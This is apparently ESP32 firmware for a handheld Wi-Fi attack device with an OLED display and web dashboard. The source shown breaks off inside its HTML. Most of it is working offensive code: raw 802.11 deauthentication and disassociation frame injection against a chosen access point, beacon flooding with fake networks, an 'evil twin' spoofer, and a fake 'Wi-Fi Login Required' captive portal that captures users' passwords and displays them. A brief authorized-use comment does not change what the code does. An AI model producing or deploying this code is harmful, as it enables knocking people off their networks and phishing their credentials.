#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SH110X.h>
#include "esp_wifi.h"
#include "esp_system.h"
#include <vector>
#include <algorithm>

// Display Settings
#define i2c_Address 0x3c
#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 64
#define OLED_RESET -1
#define I2C_SDA 8
#define I2C_SCL 9

Adafruit_SH1106G display = Adafruit_SH1106G(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);

// Optional manual nudge if you want OPTICAL centering instead of geometric.
// Leave at 0,0 for true geometric centering (recommended).
#define LOGO_NUDGE_X 0
#define LOGO_NUDGE_Y 0

// Squid Boot Logo (unchanged – byte-for-byte your original array)
const unsigned char epd_bitmap_squid [] PROGMEM = {
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x03, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0f, 0xe0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x1f, 0xf0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x3f, 0xf8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x7f, 0xfc, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xfe, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x03, 0xff, 0xff, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x03, 0xff, 0xff, 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x03, 0xff, 0xff, 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x63, 0xff, 0xff, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x31, 0xff, 0xff, 0x0c, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x30, 0xff, 0xfe, 0x0c, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x30, 0x7f, 0xfe, 0x0c, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x60, 0x7f, 0xfe, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x60, 0x7f, 0xfe, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xc0, 0x7f, 0xfe, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0xc0, 0x7f, 0xfe, 0x03, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x03, 0x80, 0x7f, 0xfe, 0x01, 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x03, 0x00, 0x7f, 0xfe, 0x00, 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00, 0xff, 0xfe, 0x00, 0xe0, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x06, 0x00, 0xff, 0xfe, 0x00, 0xe0, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x06, 0x00, 0xff, 0xfe, 0x00, 0xe0, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x06, 0x00, 0xff, 0xfe, 0x00, 0xe0, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x06, 0x00, 0xff, 0xfe, 0x00, 0xe0, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00, 0x7f, 0xfe, 0x00, 0xe0, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00, 0x7f, 0xfe, 0x00, 0xe0, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00, 0x7f, 0xfe, 0x01, 0xe0, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x03, 0x80, 0x7f, 0xfe, 0x03, 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x03, 0xc1, 0xff, 0xff, 0x07, 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0xff, 0xff, 0xff, 0xff, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x0f, 0xff, 0xff, 0xff, 0xff, 0xf8, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x1f, 0xff, 0xff, 0xff, 0xff, 0xfc, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x3f, 0xff, 0xfe, 0xff, 0xff, 0xfc, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x78, 0x3f, 0xfc, 0x7f, 0xfc, 0x0e, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x70, 0x03, 0xf8, 0x3f, 0xe0, 0x0e, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x60, 0x03, 0xf0, 0x1f, 0xe0, 0x0e, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x60, 0x03, 0xe0, 0x0f, 0xe0, 0x0e, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x30, 0x47, 0xc0, 0x03, 0xf1, 0x0c, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x18, 0xc7, 0x80, 0x01, 0xf1, 0xfc, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x0f, 0x87, 0x00, 0x00, 0xf0, 0xf8, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0f, 0x00, 0x00, 0x78, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0e, 0x04, 0x20, 0x78, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0e, 0x06, 0x20, 0x78, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0f, 0x06, 0x20, 0x70, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x8e, 0x30, 0xf0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0xfc, 0x3f, 0xe0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x03, 0xf8, 0x1f, 0xe0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xf0, 0x07, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

// AP Settings
String currentSSID = "P01yg107_Command";
const char* password = "password123";

WebServer server(80);
DNSServer dnsServer;
const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 4, 1);
int apChannel = 1;   // control-AP channel; remembered so we can snap back after off-channel ops

// ---- Scan result storage ----
struct APResult {
  String ssid;
  String bssid;
  uint8_t ch;
  int rssi;
  String enc;
  bool hidden;
};
std::vector<APResult> lastScan;
int scanOpenCount = 0, scanHiddenCount = 0;

// Global State
unsigned long lastUpdate = 0;
bool isScanning = false;
String deepScanHTML = "<p class='sys-text'>Awaiting execution...</p>";

bool portalActive = false;
bool deauthActive = false;
bool beaconSpamActive = false;
bool continuousScan = false;

String deauthTargetBSSID = "";
int deauthChannel = 1;
String lastCapturedCred = "none";
std::vector<String> capturedCreds;
String lastCredUser = "";
String lastCredPass = "";
unsigned long lastCredMillis = 0;   // time of most recent capture (drives OLED flash)

// Hunt (device locator) mode
String huntTarget = "";
int huntRSSI = -100;
bool huntActive = false;

// Beacon spam list
std::vector<String> beaconSSIDs;
int beaconIndex = 0;

// Attack / scan timers
unsigned long lastDeauthTX = 0;
unsigned long lastBeaconTX = 0;
unsigned long lastContScan = 0;
unsigned long lastHuntScan = 0;
uint8_t animFrame = 0;   // drives the scan-meter sweep animation

// ============================================================
//  AUTHORIZED-USE NOTE
//  Deauth + beacon features transmit real 802.11 management
//  frames. Only run them against networks/devices you own or
//  are explicitly contracted to test. — P01yg107 Labs
// ============================================================

// Encryption helper (original)
String translateEncryptionType(wifi_auth_mode_t encryptionType) {
  switch (encryptionType) {
    case (WIFI_AUTH_OPEN): return "OPEN";
    case (WIFI_AUTH_WEP): return "WEP";
    case (WIFI_AUTH_WPA_PSK): return "WPA";
    case (WIFI_AUTH_WPA2_PSK): return "WPA2";
    case (WIFI_AUTH_WPA_WPA2_PSK): return "WPA+WPA2";
    case (WIFI_AUTH_WPA2_ENTERPRISE): return "WPA2-ENT";
    case (WIFI_AUTH_WPA3_PSK): return "WPA3";
    default: return "UNKNOWN";
  }
}

// Tiny OUI vendor lookup (first 3 octets). Extend as you like.
String ouiVendor(const String& bssidIn) {
  String p = bssidIn.substring(0, 8); p.toUpperCase();
  struct { const char* oui; const char* name; } t[] = {
    {"AC:DE:48","Espressif"},{"24:0A:C4","Espressif"},{"7C:9E:BD","Espressif"},
    {"A4:CF:12","Espressif"},{"C4:4F:33","Espressif"},{"DC:A6:32","RaspPi"},
    {"B8:27:EB","RaspPi"},{"E4:5F:01","RaspPi"},{"3C:5A:B4","Google"},
    {"F4:F5:E8","Google"},{"00:03:93","Apple"},{"F0:18:98","Apple"},
    {"A8:60:B6","Apple"},{"D0:03:4B","Apple"},{"2C:30:33","Netgear"},
    {"A0:40:A0","Netgear"},{"20:E5:2A","Netgear"},{"00:14:BF","Linksys"},
    {"C0:56:27","Belkin"},{"EC:1A:59","Belkin"},{"00:50:F2","Microsoft"},
    {"00:0C:43","Ralink"},{"00:25:9C","Cisco"}
  };
  for (auto &e : t) if (p == String(e.oui)) return String(e.name);
  return "-";
}

// Parse "AA:BB:CC:DD:EE:FF" -> 6 bytes
bool parseBSSID(const String& s, uint8_t* out) {
  if (s.length() < 17) return false;
  for (int i = 0; i < 6; i++)
    out[i] = (uint8_t) strtol(s.substring(i * 3, i * 3 + 2).c_str(), NULL, 16);
  return true;
}

// ---- Self-centering boot logo ----
// Scans the PROGMEM bitmap for the content bounding box and draws it
// centered on both axes, independent of where the art sits in the frame.
void drawBitmapCentered(const unsigned char* bmp, int w, int h) {
  int rowBytes = (w + 7) / 8;
  int minX = w, maxX = -1, minY = h, maxY = -1;
  for (int y = 0; y < h; y++) {
    for (int x = 0; x < w; x++) {
      uint8_t b = pgm_read_byte(&bmp[y * rowBytes + (x >> 3)]);
      if (b & (0x80 >> (x & 7))) {
        if (x < minX) minX = x;
        if (x > maxX) maxX = x;
        if (y < minY) minY = y;
        if (y > maxY) maxY = y;
      }
    }
  }
  display.clearDisplay();
  if (maxX < 0) {  // empty bitmap fallback
    display.drawBitmap(0, 0, bmp, w, h, SH110X_WHITE);
  } else {
    int cw = maxX - minX + 1;
    int chh = maxY - minY + 1;
    int offX = (SCREEN_WIDTH - cw) / 2 - minX + LOGO_NUDGE_X;
    int offY = (SCREEN_HEIGHT - chh) / 2 - minY + LOGO_NUDGE_Y;
    display.drawBitmap(offX, offY, bmp, w, h, SH110X_WHITE);
    Serial.printf("[LOGO] content x[%d..%d] y[%d..%d] -> draw offset (%d,%d)\n",
                  minX, maxX, minY, maxY, offX, offY);
  }
  display.display();
}

// Print text horizontally centered (text size 1 = ~6px/char)
void printCentered(const String& s, int y) {
  int x = (SCREEN_WIDTH - (int)s.length() * 6) / 2;
  if (x < 0) x = 0;
  display.setCursor(x, y);
  display.print(s);
}

// ---- OLED home screen ----
void updateOLED() {
  if (isScanning) return;
  animFrame++;

  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SH110X_WHITE);

  // Branded header
  printCentered("P01yg107 Labs", 0);
  display.drawLine(0, 10, 128, 10, SH110X_WHITE);

  // Capture flash: briefly announce a fresh credential grab
  if (lastCredMillis != 0 && (millis() - lastCredMillis) < 1600) {
    display.setTextSize(2);
    display.setCursor(16, 18);
    display.print("GOT CRED");
    display.setTextSize(1);
    printCentered(lastCredUser.substring(0, 20), 44);
    display.display();
    return;
  }

  if (huntActive) {
    // Locator readout + big signal bar
    String tail = (huntTarget.length() > 8) ? huntTarget.substring(9) : huntTarget;
    display.setCursor(0, 14); display.print("HUNT "); display.println(tail);
    display.setCursor(0, 26); display.print("RSSI: "); display.print(huntRSSI); display.println(" dBm");
    int w = map(constrain(huntRSSI, -90, -30), -90, -30, 0, 126);
    display.drawRect(0, 38, 128, 12, SH110X_WHITE);
    if (w > 0) display.fillRect(1, 39, w, 10, SH110X_WHITE);
  } else if (portalActive) {
    // Captive-portal view: show captured credentials on the SIREN itself
    display.setCursor(0, 13);
    display.print("PORTAL  caps:"); display.print(capturedCreds.size());
    if (capturedCreds.empty()) {
      display.setCursor(0, 30);
      display.print("Waiting for login...");
    } else {
      display.setCursor(0, 25);
      display.print("U:"); display.print(lastCredUser.substring(0, 19));
      display.setCursor(0, 37);
      display.print("P:"); display.print(lastCredPass.substring(0, 19));
    }
    display.drawFastHLine(0, 51, 128, SH110X_WHITE);
  } else {
    // Stats line
    display.setCursor(0, 13);
    display.print("AP:"); display.print(lastScan.size());
    display.print(" CL:"); display.print(WiFi.softAPgetStationNum());
    if (!lastScan.empty()) { display.print(" "); display.print(lastScan[0].rssi); }

    // ---- WiFi scan meter: equalizer of detected APs (strongest first) ----
    const int topY = 23, baseY = 44;
    int nbars = lastScan.size() > 16 ? 16 : (int)lastScan.size();
    for (int i = 0; i < nbars; i++) {
      int h = map(constrain(lastScan[i].rssi, -90, -30), -90, -30, 2, baseY - topY);
      display.fillRect(i * 8, baseY - h, 6, h, SH110X_WHITE);
    }
    display.drawFastHLine(0, baseY + 1, 128, SH110X_WHITE);  // baseline
    if (nbars == 0) { display.setCursor(28, 31); display.print("[ no nets ]"); }

    // Sweeping scanner cursor (black notch slides across the spectrum)
    int cx = (animFrame * 6) % 128;
    display.drawFastVLine(cx, topY, baseY - topY, SH110X_BLACK);

    // Active-mode flags
    display.setCursor(0, 47);
    if (portalActive)     display.print("P ");
    if (deauthActive)     display.print("D ");
    if (beaconSpamActive) display.print("B ");
    if (continuousScan)   display.print("C ");
  }

  // GUI IP — always pinned at the bottom
  display.setCursor(0, 56);
  display.print("GUI "); display.print(WiFi.softAPIP());
  display.display();
}

// ---- Core scan ----
// chFilter 0 = all channels, else lock to a single channel
void doScan(int chFilter) {
  isScanning = true;
  display.clearDisplay();
  display.setCursor(0, 20);
  display.setTextSize(1);
  display.println(">> RADIO ACTIVE <<");
  display.print("Scan ch:"); display.println(chFilter == 0 ? "ALL" : String(chFilter));
  display.display();

  int n = WiFi.scanNetworks(false, true, false, 300, chFilter);

  lastScan.clear();
  scanOpenCount = 0;
  scanHiddenCount = 0;

  for (int i = 0; i < n; ++i) {
    APResult r;
    r.ssid   = WiFi.SSID(i);
    r.hidden = (r.ssid.length() == 0);
    r.bssid  = WiFi.BSSIDstr(i);
    r.ch     = WiFi.channel(i);
    r.rssi   = WiFi.RSSI(i);
    r.enc    = translateEncryptionType(WiFi.encryptionType(i));
    if (r.enc == "OPEN") scanOpenCount++;
    if (r.hidden) scanHiddenCount++;
    lastScan.push_back(r);
  }
  WiFi.scanDelete();

  // sort strongest signal first
  std::sort(lastScan.begin(), lastScan.end(),
            [](const APResult& a, const APResult& b) { return a.rssi > b.rssi; });

  // rebuild HTML table
  if (lastScan.empty()) {
    deepScanHTML = "<p>No targets found.</p>";
  } else {
    deepScanHTML = "<table><tr><th>SSID</th><th>BSSID</th><th>VENDOR</th><th>CH</th><th>PWR</th><th>ENC</th></tr>";
    for (auto &r : lastScan) {
      deepScanHTML += "<tr>";
      deepScanHTML += "<td>" + (r.hidden ? String("&lt;HIDDEN&gt;") : r.ssid) + "</td>";
      deepScanHTML += "<td>" + r.bssid + "</td>";
      deepScanHTML += "<td>" + ouiVendor(r.bssid) + "</td>";
      deepScanHTML += "<td>" + String(r.ch) + "</td>";
      deepScanHTML += "<td>" + String(r.rssi) + "</td>";
      String ec = r.enc; if (ec == "OPEN") ec = "<span style='color:#f00'>OPEN</span>";
      deepScanHTML += "<td>" + ec + "</td>";
      deepScanHTML += "</tr>";
    }
    deepScanHTML += "</table>";
  }
  isScanning = false;
}

// ---- Hunt: refresh RSSI for the tracked BSSID ----
void updateHunt() {
  isScanning = true;
  int n = WiFi.scanNetworks(false, true, false, 120, 0);
  int found = -100;
  String tgt = huntTarget; tgt.toUpperCase();
  for (int i = 0; i < n; ++i) {
    String b = WiFi.BSSIDstr(i); b.toUpperCase();
    if (b == tgt) { found = WiFi.RSSI(i); break; }
  }
  WiFi.scanDelete();
  huntRSSI = found;
  isScanning = false;
}

// ---- Deauth frame (broadcast to all clients of target BSSID) ----
uint8_t deauthPkt[26] = {
  0xC0, 0x00, 0x00, 0x00,
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,   // dest = broadcast
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,   // src   (target BSSID)
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,   // bssid (target BSSID)
  0x00, 0x00,                           // seq
  0x07, 0x00                            // reason: class-3 frame from nonassoc STA
};

void sendDeauth() {
  uint8_t bssid[6];
  if (!parseBSSID(deauthTargetBSSID, bssid)) return;
  memcpy(&deauthPkt[10], bssid, 6);
  memcpy(&deauthPkt[16], bssid, 6);
  // Hop to target channel. NOTE: this moves the radio off the control-AP
  // channel, so the phone driving this GUI may briefly drop until you STOP.
  esp_wifi_set_channel(deauthChannel, WIFI_SECOND_CHAN_NONE);

  deauthPkt[0] = 0xC0;  // deauth
  for (int i = 0; i < 6; i++) { esp_wifi_80211_tx(WIFI_IF_AP, deauthPkt, 26, false); delayMicroseconds(400); }
  deauthPkt[0] = 0xA0;  // disassociate
  for (int i = 0; i < 6; i++) { esp_wifi_80211_tx(WIFI_IF_AP, deauthPkt, 26, false); delayMicroseconds(400); }
  deauthPkt[0] = 0xC0;
}

// ---- Beacon frame (fake AP flood) ----
void sendBeacon(const String& ssid) {
  uint8_t pkt[128];
  int i = 0;
  uint8_t hdr[] = {0x80, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
  memcpy(pkt, hdr, 10); i = 10;
  uint8_t mac[6] = {0x24, 0x0A, 0xC4,
                    (uint8_t)random(256), (uint8_t)random(256), (uint8_t)random(256)};
  memcpy(pkt + i, mac, 6); i += 6;   // src
  memcpy(pkt + i, mac, 6); i += 6;   // bssid
  pkt[i++] = 0x00; pkt[i++] = 0x00;  // seq
  for (int t = 0; t < 8; t++) pkt[i++] = 0x00; // timestamp
  pkt[i++] = 0x64; pkt[i++] = 0x00;  // beacon interval
  pkt[i++] = 0x01; pkt[i++] = 0x00;  // caps: ESS, open
  // SSID tag
  pkt[i++] = 0x00; pkt[i++] = (uint8_t)ssid.length();
  for (unsigned int s = 0; s < ssid.length(); s++) pkt[i++] = ssid[s];
  // supported rates
  uint8_t rates[] = {0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c};
  memcpy(pkt + i, rates, sizeof(rates)); i += sizeof(rates);
  // DS param (channel)
  pkt[i++] = 0x03; pkt[i++] = 0x01; pkt[i++] = (uint8_t)apChannel;
  esp_wifi_80211_tx(WIFI_IF_AP, pkt, i, false);
}

// Captive portal page
const char portal_html[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html><head>
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Sign in</title>
<style>
body{font-family:system-ui;background:#f5f5f5;margin:0;padding:20px;text-align:center}
.card{background:#fff;max-width:360px;margin:40px auto;padding:24px;border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,.1)}
input{width:100%;padding:12px;margin:8px 0;border:1px solid #ddd;border-radius:6px;box-sizing:border-box}
button{width:100%;padding:12px;background:#1a73e8;color:#fff;border:none;border-radius:6px;font-weight:600}
</style></head><body>
<div class="card">
<h2>Wi-Fi Login Required</h2>
<p>Enter credentials to continue</p>
<form action="/portal_login" method="POST">
<input type="text" name="user" placeholder="Email / Username" required>
<input type="password" name="pass" placeholder="Password" required>
<button type="submit">Connect</button>
</form>
</div></body></html>
)rawliteral";

// Main dashboard
const char index_html[] PROGMEM = R"rawliteral(
<!DOCTYPE HTML><html>
<head>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>P01yg107 Command</title>
  <style>
    body { font-family: 'Courier New', Courier, monospace; background-color: #050505; color: #0f0; margin: 0; padding: 20px;}
    .container { max-width: 640px; margin: auto; }
    .header { border-bottom: 1px solid #0f0; padding-bottom: 10px; margin-bottom: 20px; text-align: center;}
    h1 { margin: 0; font-size: 22px; color: #fff;}
    .panel { background: #111; border: 1px solid #333; padding: 15px; margin-bottom: 18px; border-radius: 4px;}
    .stat-row { display: flex; justify-content: space-between; border-bottom: 1px dashed #333; padding: 4px 0;}
    .sys-text { color: #0ff; }
    button { background: #020; border: 1px solid #0f0; color: #0f0; padding: 10px; width: 100%; cursor: pointer; font-weight: bold; margin-bottom: 8px;}
    button:hover { background: #0f0; color: #000; }
    .danger-btn { border-color: #f00; color: #f00; }
    .danger-btn:hover { background: #f00; color: #000; }
    .warn-btn { border-color: #fa0; color: #fa0; }
    .warn-btn:hover { background: #fa0; color: #000; }
    .row2 { display:flex; gap:8px; }
    .row2 > * { flex:1; }
    input[type=text], textarea { width: calc(100% - 22px); padding: 10px; background: #000; border: 1px solid #555; color: #fff; margin-bottom: 8px; font-family: monospace;}
    textarea { resize: vertical; min-height: 60px; }
    table { width: 100%; border-collapse: collapse; margin-top: 8px; font-size: 11px;}
    th, td { border: 1px solid #333; padding: 4px; text-align: left; }
    th { color: #fff; }
    .status { font-size: 12px; color: #0ff; margin-top: 6px; }
    .bar { height:14px; background:#020; border:1px solid #0f0; margin-top:6px;}
    .barfill { height:100%; background:#0f0; width:0%; }
    small { color:#666; }
  </style>
</head>
<body>
  <div class="container">
    <div class="header">
      <h1>P01YG107_LABS</h1>
      <span class="sys-text">S2 MINI TACTICAL NODE</span>
    </div>

    <div class="panel">
      <h3>> SYSTEM_STATS</h3>
      <div class="stat-row"><span>UPTIME:</span><span id="uptime" class="sys-text">--</span></div>
      <div class="stat-row"><span>FREE_HEAP:</span><span id="heap" class="sys-text">--</span></div>
      <div class="stat-row"><span>AP_CLIENTS:</span><span id="clients" class="sys-text">--</span></div>
      <div class="stat-row"><span>APS_SEEN:</span><span id="apcount" class="sys-text">--</span></div>
      <div class="stat-row"><span>OPEN / HIDDEN:</span><span id="ophid" class="sys-text">--</span></div>
      <div class="stat-row"><span>PORTAL:</span><span id="portalStat" class="sys-text">OFF</span></div>
      <div class="stat-row"><span>DEAUTH:</span><span id="deauthStat" class="sys-text">OFF</span></div>
      <div class="stat-row"><span>BEACON:</span><span id="beaconStat" class="sys-text">OFF</span></div>
      <div class="stat-row"><span>CONT_SCAN:</span><span id="contStat" class="sys-text">OFF</span></div>
    </div>

    <div class="panel">
      <h3>> DEEP_RECON</h3>
      <button onclick="runDeepScan()">EXECUTE 802.11 SCAN (ALL CH)</button>
      <div class="row2">
        <input type="text" id="scanCh" placeholder="Channel 1-13">
        <button onclick="runChScan()">SCAN THIS CH</button>
      </div>
      <div class="row2">
        <button onclick="toggleContScan()">TOGGLE CONTINUOUS</button>
        <button onclick="exportCsv()">EXPORT CSV</button>
      </div>
      <div id="scanData" style="overflow-x:auto;">%SCAN_RESULTS%</div>
    </div>

    <div class="panel">
      <h3>> DEVICE HUNT (RSSI LOCATOR)</h3>
      <input type="text" id="huntBSSID" placeholder="Target BSSID to locate">
      <div class="row2">
        <button class="warn-btn" onclick="startHunt()">START HUNT</button>
        <button onclick="stopHunt()">STOP</button>
      </div>
      <div class="bar"><div id="huntBar" class="barfill"></div></div>
      <div id="huntMsg" class="status">Idle. Walk toward target; bar grows as signal strengthens.</div>
    </div>

    <div class="panel">
      <h3>> OFFENSIVE_OPS - EVIL TWIN</h3>
      <input type="text" id="cloneTarget" placeholder="Target SSID to spoof...">
      <button class="danger-btn" onclick="spawnEvilTwin()">SPAWN EVIL TWIN AP</button>
      <p id="twinStatus" class="sys-text"></p>
    </div>

    <div class="panel">
      <h3>> ACTIVE PORTAL / CAPTIVE LOGIN</h3>
      <button class="warn-btn" onclick="togglePortal()">TOGGLE CAPTIVE PORTAL</button>
      <button onclick="clearCreds()">CLEAR CAPTURED CREDS</button>
      <div id="credList" class="status">No credentials yet.</div>
    </div>

    <div class="panel">
      <h3>> DEAUTH</h3>
      <input type="text" id="deauthBSSID" placeholder="Target BSSID (AA:BB:CC:DD:EE:FF)">
      <input type="text" id="deauthCH" placeholder="Channel (1-13)" value="1">
      <div class="row2">
        <button class="danger-btn" onclick="startDeauth()">START DEAUTH</button>
        <button onclick="stopDeauth()">STOP DEAUTH</button>
      </div>
      <p id="deauthMsg" class="status"></p>
      <small>Off-channel deauth may drop your link to this node until STOP.</small>
    </div>

    <div class="panel">
      <h3>> BEACON / SSID FLOOD</h3>
      <textarea id="beaconList" placeholder="One SSID per line (blank = random names)"></textarea>
